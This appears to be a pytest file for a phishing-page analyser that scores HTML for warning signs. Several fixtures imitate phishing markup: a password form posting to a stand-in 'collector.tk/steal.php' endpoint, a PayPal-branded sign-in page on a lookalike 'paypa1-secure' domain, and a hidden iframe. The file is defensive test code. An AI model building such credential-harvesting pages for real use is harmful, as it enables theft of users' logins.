import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from page_analysis import analyse_page


def titles(findings):
    return [finding["title"] for finding in findings]


def test_empty_body_scores_nothing():
    score, findings = analyse_page("", "https://example.com")
    assert score == 0
    assert findings == []


def test_password_field_alone_is_not_penalised():
    # Every genuine sign-in page has one.
    html = '<html><body><form action="/auth"><input type="password"></form></body></html>'
    score, findings = analyse_page(html, "https://accounts.example.com/signin")
    assert score == 0
    assert "Page contains a password field" in titles(findings)


def test_cross_domain_login_form_is_high_severity():
    html = (
        '<html><body><form action="https://collector.tk/steal.php">'
        '<input type="password"></form></body></html>'
    )
    score, findings = analyse_page(html, "https://bank-login.cfd/signin")
    assert score >= 35
    assert "Login form submits to a different domain" in titles(findings)


def test_cross_domain_form_without_password_is_minor():
    html = '<html><body><form action="https://analytics.example.net/track"></form></body></html>'
    score, findings = analyse_page(html, "https://shop.example.com/")
    assert 0 < score < 35
    assert "Form submits to a different domain" in titles(findings)


def test_password_field_over_http_is_flagged():
    html = '<html><body><form action="/x"><input type="password"></form></body></html>'
    score, findings = analyse_page(html, "http://insecure.example.com/login")
    assert score >= 30
    assert "Password field on an unencrypted page" in titles(findings)


def test_brand_title_mismatch_requires_a_password_field():
    # An article about a brand is not impersonation.
    article = '<html><head><title>PayPal - Wikipedia</title></head><body></body></html>'
    score, findings = analyse_page(article, "https://en.wikipedia.org/wiki/PayPal")
    assert score == 0
    assert findings == []


def test_brand_title_mismatch_on_a_sign_in_page_is_flagged():
    html = (
        '<html><head><title>PayPal - Log In</title></head><body>'
        '<form action="/x"><input type="password"></form></body></html>'
    )
    score, findings = analyse_page(html, "https://paypa1-secure.cfd/login")
    assert score >= 25
    assert any("does not match the domain" in title for title in titles(findings))


def test_genuine_brand_sign_in_page_is_not_flagged():
    html = (
        '<html><head><title>Log in to your PayPal account</title></head><body>'
        '<form action="/signin"><input type="password"></form></body></html>'
    )
    score, _ = analyse_page(html, "https://www.paypal.com/signin")
    assert score == 0


def test_hidden_iframe_is_flagged():
    html = '<html><body><iframe src="x" style="display:none"></iframe></body></html>'
    score, findings = analyse_page(html, "https://example.com/")
    assert score >= 15
    assert "Hidden iframe detected" in titles(findings)


def test_visible_iframe_is_not_flagged():
    html = '<html><body><iframe src="https://youtube.com/embed/x" width="560" height="315"></iframe></body></html>'
    score, _ = analyse_page(html, "https://blog.example.com/post")
    assert score == 0


def test_malformed_html_does_not_raise():
    html = "<html><body><form action=<<>><input type=password</body>"
    score, _ = analyse_page(html, "https://example.com/")
    assert isinstance(score, int)
